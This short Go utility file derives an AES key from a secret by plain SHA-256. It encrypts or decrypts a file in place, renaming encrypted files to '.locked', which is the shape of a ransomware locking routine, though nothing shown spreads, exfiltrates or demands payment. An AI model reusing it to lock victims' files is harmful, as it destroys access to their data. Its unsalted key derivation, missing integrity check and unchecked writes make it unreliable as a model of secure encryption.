package utils

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "io"
    "io/ioutil"
    "log"
    "os"
    "strings"
)

// given a secret returns the sha256 hash
// used for encryption/decryption
func DeriveKey(secret string)[32]byte{
    return sha256.Sum256([]byte(secret))
}

// given a file path and a key, encrypts the file with the key
func Encrypt(filePath string, secretKey []byte) {

    // open the given file
    data, err := ioutil.ReadFile(filePath)
    if err != nil {
	panic(err)
    }

    // create AES CFB cipher
    block, err := aes.NewCipher(secretKey)
    if err != nil {
	panic(err)
    }

    ciphertext := make([]byte, aes.BlockSize+len(data))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
	panic(err)
    }

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], data)

    // write the ciphertext in the file
    ioutil.WriteFile(filePath,ciphertext,0644)

    // use .locked as extension for encrypted files
    err = os.Rename(filePath, filePath+".locked")
    if err != nil {
	log.Fatal(err)
    }
}


func Decrypt(filePath string, secretKey []byte) {

    // open the given file
    ciphertext, err := ioutil.ReadFile(filePath)
    if err != nil {
	panic(err)
    }

    // create AES CFB cipher
    block, err := aes.NewCipher(secretKey)
    if err != nil {
	panic(err)
    }

    iv := ciphertext[:aes.BlockSize]
    ciphertext = ciphertext[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(ciphertext, ciphertext)

    // write the plaintext in the file
    ioutil.WriteFile(filePath,ciphertext,0644)

    // remove .locked extension if present
    if strings.HasSuffix(filePath,".locked"){

	// remove suffix if appended
	newFilePath := filePath[:len(filePath)-7]
	err = os.Rename(filePath, newFilePath)
	if err != nil {
	    log.Fatal(err)
	}
    }

}
